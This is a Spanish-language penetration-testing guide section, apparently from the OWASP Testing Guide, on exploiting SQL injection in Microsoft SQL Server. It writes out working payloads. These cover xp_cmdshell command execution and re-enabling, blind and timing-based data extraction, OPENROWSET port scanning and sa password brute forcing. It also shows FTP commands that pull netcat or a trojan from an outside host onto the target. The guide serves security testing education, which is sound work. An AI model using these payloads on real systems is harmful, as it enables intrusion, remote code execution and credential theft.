SQL Server

Resumen

En esta sección se tratarán algunas técnicas de Inyección SQL que aprovechan características específicas de Microsoft SQL Server.

Las vulnerabilidades de inyección SQL ocurren siempre que se utiliza una entrada en la construcción de una consulta SQL sin estar adecuadamente restringida o sanitizada. El uso de SQL dinámico (la construcción de consultas SQL mediante concatenación de cadenas) abre la puerta a estas vulnerabilidades. La inyección SQL permite a un atacante acceder a los servidores SQL y ejecutar código SQL con los privilegios del usuario utilizado para conectarse a la base de datos.

Como se explica en SQL injection, explotar una inyección SQL requiere dos cosas: un punto de entrada y un exploit para introducir. Cualquier parámetro controlado por el usuario que sea procesado por la aplicación podría estar ocultando una vulnerabilidad. Esto incluye:

  • Parámetros de la aplicación en query strings (por ejemplo, peticiones GET)
  • Parámetros de la aplicación incluidos como parte del cuerpo de una petición POST
  • Información relacionada con el navegador (por ejemplo, user-agent, referrer)
  • Información relacionada con el host (por ejemplo, nombre de host, IP)
  • Información relacionada con la sesión (por ejemplo, ID de usuario, cookies)

Microsoft SQL server tiene algunas características únicas, por lo que algunos exploits deben personalizarse especialmente para esta aplicación.

Cómo probar

Características de SQL Server

Para empezar, veamos algunos operadores y comandos/procedimientos almacenados de SQL Server útiles en una prueba de inyección SQL:

  • operador de comentario: -- (útil para forzar a la consulta a ignorar el resto de la consulta original; esto no será necesario en todos los casos)
  • separador de consultas: ; (punto y coma)
  • Procedimientos almacenados y características útiles:
    • xp_cmdshell ejecuta un shell de comandos en el servidor bajo el contexto de la cuenta de servicio de SQL Server. Requiere privilegios de sysadmin y está deshabilitado por defecto desde SQL Server 2005 (puede volver a habilitarse con sp_configure cuando se muestran las opciones avanzadas).
    • xp_regread lee un valor arbitrario del Registro (procedimiento extendido no documentado)
    • xp_regwrite escribe un valor arbitrario en el Registro (procedimiento extendido no documentado)
    • sp_makewebtask (eliminado; presente solo en versiones muy antiguas de SQL Server) escribía los resultados de una consulta en un archivo mediante el Web Assistant.
    • xp_sendmail (eliminado junto con SQL Mail) enviaba correo electrónico que podía incluir como adjunto un conjunto de resultados de una consulta.

Los ejemplos siguientes se centran en técnicas que siguen siendo relevantes en SQL Server y en Azure SQL Managed Instance cuando se exponen funciones con privilegios. La mayoría usa exec.

A continuación mostramos cómo ejecutar un comando de shell que escribe la salida del comando dir c:\inetpub en un archivo navegable, suponiendo que el servidor web y el servidor de base de datos residen en el mismo host. La siguiente sintaxis usa xp_cmdshell:

exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--

En versiones antiguas de SQL Server que aún proporcionan los procedimientos del Web Assistant, podría usarse sp_makewebtask en su lugar:

exec sp_makewebtask 'C:\Inetpub\wwwroot\test.txt', 'select * from master.dbo.sysobjects'--

Una ejecución exitosa creará un archivo que el evaluador podrá navegar.

Además, las funciones integradas y las variables de entorno de SQL Server son muy útiles. Lo siguiente usa la función db_name() para provocar un error que devolverá el nombre de la base de datos:

/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20db_name())

Nótese el uso de convert:

CONVERT ( data_type [ ( length ) ] , expression [ , style ] )

CONVERT intentará convertir el resultado de db_name (una cadena) en una variable entera, provocando un error que, si la aplicación vulnerable lo muestra, contendrá el nombre de la base de datos.

El siguiente ejemplo usa la variable de entorno @@version, combinada con una inyección de estilo union select, para averiguar la versión de SQL Server.

/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,'stat','name1','name2',2006-01-06,1,@@version%20--

Y aquí está el mismo ataque, pero usando de nuevo el truco de conversión:

/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)

La recopilación de información es útil para explotar vulnerabilidades de software en el SQL Server, mediante la explotación de un ataque de inyección SQL o el acceso directo al listener SQL.

A continuación mostramos varios ejemplos que explotan vulnerabilidades de inyección SQL a través de diferentes puntos de entrada.

Ejemplo 1: inyección SQL en una petición GET

El caso más sencillo (y a veces el más gratificante) sería el de una página de inicio de sesión que solicita un nombre de usuario y una contraseña para el inicio de sesión del usuario. Se puede intentar introducir la siguiente cadena "' or '1'='1" (sin comillas dobles):

https://vulnerable.web.app/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1

Si la aplicación usa consultas SQL dinámicas y la cadena se añade a la consulta de validación de credenciales del usuario, esto puede dar lugar a un inicio de sesión exitoso en la aplicación.

Ejemplo 2: inyección SQL en una petición GET

Para averiguar cuántas columnas existen

https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--

Ejemplo 3: prueba en una petición POST

Inyección SQL, contenido HTTP POST: email=%27&whichSubmit=submit&submit.x=0&submit.y=0

Un ejemplo completo de POST (https://vulnerable.web.app/forgotpass.asp):

POST /forgotpass.asp HTTP/1.1
Host: vulnerable.web.app
[...]
Referer: https://vulnerable.web.app/forgotpass.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

email=%27&whichSubmit=submit&submit.x=0&submit.y=0

El mensaje de error obtenido cuando se introduce un carácter ' (comilla simple) en el campo email es:

Microsoft OLE DB Provider for SQL Server error '80040e14'
Unclosed quotation mark before the character string '' '.
/forgotpass.asp, line 15

Ejemplo 4: otro ejemplo (útil) de GET

Obtener el código fuente de la aplicación

a' ; master.dbo.xp_cmdshell ' copy c:\inetpub\wwwroot\login.aspx c:\inetpub\wwwroot\login.txt';--

Ejemplo 5: habilitar o reemplazar xp_cmdshell

Las líneas base de seguridad mantienen xp_cmdshell deshabilitado. Con privilegios de sysadmin (de forma nativa o tras recuperar la contraseña de sa o de administrador; véase más abajo), se puede volver a habilitar o recrear una funcionalidad equivalente.

Habilitar xp_cmdshell inyectando:

master..sp_configure 'show advanced options',1
reconfigure
master..sp_configure 'xp_cmdshell',1
reconfigure

En entornos antiguos de SQL Server 2000, si xp_cmdshell se eliminó con sp_dropextendedproc, podía restaurarse con:

sp_addextendedproc 'xp_cmdshell','xp_log70.dll'

Si eso fallaba porque xp_log70.dll había sido movido o eliminado, un procedimiento personalizado usando OLE Automation (sp_OACreate, sp_OAMethod, sp_OADestroy) podía recrear la ejecución de shell, como describe Antonin Foller (véanse los enlaces al final de la página), siempre que OLE Automation siguiera habilitado.

Ejemplo 6: Referer / User-Agent

La cabecera REFERER establecida en:

Referer: https://vulnerable.web.app/login.aspx', 'user_agent', 'some_ip'); [SQL CODE]--

Permite la ejecución de código SQL arbitrario. Lo mismo ocurre con la cabecera User-Agent establecida en:

User-Agent: user_agent', 'some_ip'); [SQL CODE]--

Ejemplo 7: SQL Server como escáner de puertos

En SQL Server, uno de los comandos más útiles (al menos para el pentester) es OPENROWSET, que se usa para ejecutar una consulta en otro servidor de base de datos y recuperar los resultados. El evaluador de penetración puede usar este comando para escanear puertos de otras máquinas en la red objetivo, inyectando la siguiente consulta:

select * from OPENROWSET('SQLOLEDB','uid=sa;pwd=foobar;Network=DBMSSOCN;Address=x.y.w.z,p;timeout=5','select 1')--

Esta consulta intentará una conexión a la dirección x.y.w.z en el puerto p. Si el puerto está cerrado, se devolverá el siguiente mensaje:

SQL Server does not exist or access denied

Por otro lado, si el puerto está abierto, se devolverá uno de los siguientes errores:

General network error. Check your network documentation

OLE DB provider 'sqloledb' reported an error. The provider did not give any information about the error.

Por supuesto, el mensaje de error no siempre está disponible. Si ese es el caso, podemos usar el tiempo de respuesta para entender qué está pasando: con un puerto cerrado se consumirá el tiempo de espera (timeout, 5 segundos en este ejemplo), mientras que un puerto abierto devolverá el resultado de inmediato.

Hay que tener en cuenta que OPENROWSET y las Ad Hoc Distributed Queries están deshabilitadas por defecto desde SQL Server 2005 (estaban habilitadas por defecto en SQL Server 2000).

Ejemplo 8: carga de ejecutables

Una vez que podemos usar xp_cmdshell (ya sea el nativo o uno personalizado), podemos cargar fácilmente ejecutables en el servidor de base de datos objetivo. Una opción muy común es netcat.exe, pero aquí sería útil cualquier troyano. Si al objetivo se le permite iniciar conexiones FTP hacia la máquina del evaluador, todo lo que se necesita es inyectar las siguientes consultas:

exec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--
exec master..xp_cmdshell 'echo USER >> ftpscript.txt';--
exec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--
exec master..xp_cmdshell 'echo bin >> ftpscript.txt';--
exec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--
exec master..xp_cmdshell 'echo quit >> ftpscript.txt';--
exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--

En este punto, nc.exe se habrá cargado y estará disponible.

Si el firewall no permite FTP, tenemos una alternativa que aprovecha el depurador de Windows, debug.exe, que está instalado por defecto en todas las máquinas Windows. Debug.exe admite scripts y es capaz de crear un ejecutable mediante la ejecución de un archivo de script adecuado. Lo que necesitamos hacer es convertir el ejecutable en un script de depuración (que es un archivo 100% ASCII), cargarlo línea por línea y finalmente llamar a debug.exe sobre él. Existen varias herramientas que crean este tipo de archivos de depuración (por ejemplo: makescr.exe de Ollie Whitehouse y dbgtool.exe de toolcrypt.org). Las consultas a inyectar serán por tanto las siguientes:

exec master..xp_cmdshell 'echo [debug script line #1 of n] > debugscript.txt';--
exec master..xp_cmdshell 'echo [debug script line #2 of n] >> debugscript.txt';--
....
exec master..xp_cmdshell 'echo [debug script line #n of n] >> debugscript.txt';--
exec master..xp_cmdshell 'debug.exe < debugscript.txt';--

En este punto, nuestro ejecutable está disponible en la máquina objetivo, listo para ejecutarse. Existen herramientas que automatizan este proceso, siendo la más destacada Bobcat, que se ejecuta en Windows, y Sqlninja, que se ejecuta en Unix (véanse las herramientas al final de esta página).

Obtener información cuando no se muestra (out of band)

No todo está perdido cuando la aplicación web no devuelve ninguna información, como mensajes de error descriptivos (cf. Blind SQL Injection). Por ejemplo, podría ocurrir que se tenga acceso al código fuente (por ejemplo, porque la aplicación web está basada en software de código abierto). Entonces, el pentester puede explotar sin conexión todas las vulnerabilidades de inyección SQL descubiertas en la aplicación web. Aunque un IPS podría detener algunos de estos ataques, la mejor forma de proceder sería la siguiente: desarrollar y probar los ataques en un entorno de pruebas creado para ese fin, y luego ejecutar esos ataques contra la aplicación web que se está evaluando.

Otras opciones para ataques out of band se describen en el ejemplo 4 anterior.

Ataques de inyección SQL ciega

Prueba y error

Alternativamente, se puede probar suerte. Es decir, el atacante puede suponer que existe una vulnerabilidad de inyección SQL ciega u out-of-band en la aplicación web. Entonces seleccionará un vector de ataque (por ejemplo, una entrada web), usará vectores de fuzzing contra este canal y observará la respuesta. Por ejemplo, si la aplicación web busca un libro usando una consulta

select * from books where title="text entered by the user"

entonces el evaluador de penetración podría introducir el texto: 'Bomba' OR 1=1- y, si los datos no se validan correctamente, la consulta se ejecutará y devolverá toda la lista de libros. Esto es evidencia de que existe una vulnerabilidad de inyección SQL. El evaluador de penetración podría más adelante "jugar" con las consultas para evaluar la criticidad de esta vulnerabilidad.

NOTA: Hay que tener cuidado al inyectar la condición OR 1=1 en una consulta SQL. Aunque esto puede ser inofensivo en el contexto inicial en el que se inyecta, es común que las aplicaciones usen los datos de una sola petición en varias consultas diferentes. Si la condición llega, por ejemplo, a una sentencia UPDATE o DELETE, puede producirse una pérdida accidental de datos.

Si se muestran varios mensajes de error

Por otro lado, si no se dispone de información previa, aún existe la posibilidad de atacar explotando algún "canal encubierto" (covert channel). Puede ocurrir que los mensajes de error descriptivos estén bloqueados, pero que los mensajes de error den cierta información. Por ejemplo:

  • En algunos casos, la aplicación web (en realidad, el servidor web) podría devolver el tradicional 500: Internal Server Error, por ejemplo cuando la aplicación devuelve una excepción que podría generarse, por ejemplo, por una consulta con comillas sin cerrar.
  • Mientras que en otros casos el servidor devolverá un mensaje 200 OK, pero la aplicación web devolverá algún mensaje de error insertado por los desarrolladores, como Internal server error o bad data.

Este simple bit de información puede ser suficiente para entender cómo construye la aplicación web la consulta SQL dinámica y así ajustar un exploit. Otro método out-of-band es mostrar los resultados a través de archivos navegables por HTTP.

Ataques de temporización

Hay una posibilidad más para realizar un ataque de inyección SQL ciega cuando no hay respuesta visible de la aplicación: midiendo el tiempo que tarda la aplicación web en responder a una petición. Un ataque de este tipo se describe en Anley, de donde tomamos los siguientes ejemplos. Un enfoque típico usa el comando waitfor delay: supongamos que el atacante quiere comprobar si existe la base de datos de ejemplo pubs; simplemente inyectará el siguiente comando:

if exists (select * from pubs..pub_info) waitfor delay '0:0:5'

Dependiendo del tiempo que tarde la consulta en devolver una respuesta, sabremos la respuesta. De hecho, aquí tenemos dos cosas: una vulnerabilidad de inyección SQL y un canal encubierto que permite al evaluador de penetración obtener 1 bit de información por cada consulta. Por tanto, usando varias consultas (tantas como bits tenga la información requerida), el pentester puede obtener cualquier dato que esté en la base de datos. Véase la siguiente consulta

declare @s varchar(8000)
declare @i int
select @s = db_name()
select @i = [some value]
if (select len(@s)) < @i waitfor delay '0:0:5'

Midiendo el tiempo de respuesta y usando diferentes valores para @i, podemos deducir la longitud del nombre de la base de datos actual, y luego comenzar a extraer el nombre en sí con la siguiente consulta:

if (ascii(substring(@s, @byte, 1)) & ( power(2, @bit))) > 0 waitfor delay '0:0:5'

Esta consulta esperará 5 segundos si el bit @bit del byte @byte del nombre de la base de datos actual es 1, y volverá de inmediato si es 0. Anidando dos ciclos (uno para @byte y otro para @bit), podremos extraer toda la información.

Sin embargo, podría ocurrir que el comando waitfor no esté disponible (por ejemplo, porque lo filtra un IPS o un web application firewall). Esto no significa que no se puedan realizar ataques de inyección SQL ciega, ya que el evaluador de penetración solo necesita encontrar alguna operación que consuma tiempo y que no esté filtrada. Por ejemplo

declare @i int select @i = 0
while @i < 0xaffff begin
select @i = @i + 1
end

Comprobación de la versión y de vulnerabilidades

El mismo enfoque de temporización puede usarse para identificar la versión de SQL Server mediante la variable integrada @@version:

select @@version

Ejemplos de respuestas:

Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) ...

Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) ...

Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) Oct 14 2005 00:33:37

Dado que el año del producto y el número de build se encuentran en posiciones diferentes según la versión, es mejor extraer una subcadena distintiva (por ejemplo, 2022, 2019 o el número de versión principal como 16.0) en lugar de fijar una única posición de carácter. Una comprobación basada en temporización podría ser así:

if (select @@version) like '%2022%' waitfor delay '0:0:5'

Ejemplo 9: fuerza bruta de la contraseña de sysadmin

Para forzar por fuerza bruta la contraseña de sysadmin, podemos aprovechar el hecho de que OPENROWSET necesita credenciales adecuadas para realizar correctamente la conexión y que dicha conexión también puede "redirigirse en bucle" (loop) hacia el propio servidor de base de datos local. Combinando estas características con un ataque de inyección por inferencia basado en la temporización de las respuestas, podemos inyectar el siguiente código:

select * from OPENROWSET('SQLOLEDB','';'sa';'<pwd>','select 1;waitfor delay ''0:0:5'' ')

Lo que estamos haciendo aquí es intentar una conexión a la base de datos local (especificada por el campo vacío después de SQLOLEDB) usando sa y <pwd> como credenciales. Si la contraseña es correcta y la conexión tiene éxito, la consulta se ejecuta, haciendo que la base de datos espere 5 segundos (y también devolviendo un valor, ya que OPENROWSET espera al menos una columna). Obteniendo las contraseñas candidatas de una lista de palabras y midiendo el tiempo necesario para cada conexión, podemos intentar adivinar la contraseña correcta. En "Data-mining with SQL Injection and Inference", David Litchfield lleva esta técnica aún más lejos, inyectando un fragmento de código para forzar por fuerza bruta la contraseña de sysadmin usando los propios recursos de CPU del servidor de base de datos.

Una vez que tenemos la contraseña de sysadmin, tenemos dos opciones:

  • Inyectar todas las consultas siguientes usando OPENROWSET, para usar los privilegios de sysadmin
  • Añadir nuestro usuario actual al grupo sysadmin usando sp_addsrvrolemember. El nombre de usuario actual puede extraerse mediante inyección por inferencia contra la variable system_user.

Hay que recordar que las Ad Hoc Distributed Queries y OPENROWSET han estado restringidas desde SQL Server 2005 y normalmente deben habilitarse explícitamente por un administrador.
